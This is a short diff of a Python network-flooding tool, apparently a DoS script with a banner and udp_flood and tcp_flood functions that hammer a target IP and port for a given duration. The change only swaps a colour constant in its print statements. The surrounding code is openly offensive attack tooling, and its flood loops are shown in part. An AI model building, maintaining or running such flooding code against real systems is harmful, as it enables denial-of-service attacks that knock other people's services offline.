@@ -8,7 +8,7 @@ from colorama import Fore, init
 init(autoreset=True)
 
 def banner():
-    print(Fore.PURPLE + r''' 
+    print(Fore.MAGENTA + r''' 
       /$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$$$$$$$
      /$$__  $$| $$__  $$|_  $$_/|_____ $$ |_____ $$ 
     | $$  \__/| $$  \ $$  | $$       /$$/      /$$/ 
@@ -24,7 +24,7 @@ def banner():
 def udp_flood(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print(Fore.PURPLE + f"[UDP] Attacking {ip}:{port} for {duration} seconds")
+    print(Fore.MAGENTA + f"[UDP] Attacking {ip}:{port} for {duration} seconds")
     while time.time() < timeout:
         try:
             for _ in range(100):
@@ -35,7 +35,7 @@ def udp_flood(ip, port, duration):
 
 def tcp_flood(ip, port, duration):
     timeout = time.time() + duration
-    print(Fore.PURPLE + f"[TCP] Sending SYN to {ip}:{port} for {duration} seconds")
+    print(Fore.MAGENTA + f"[TCP] Sending SYN to {ip}:{port} for {duration} seconds")
     while time.time() < timeout:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
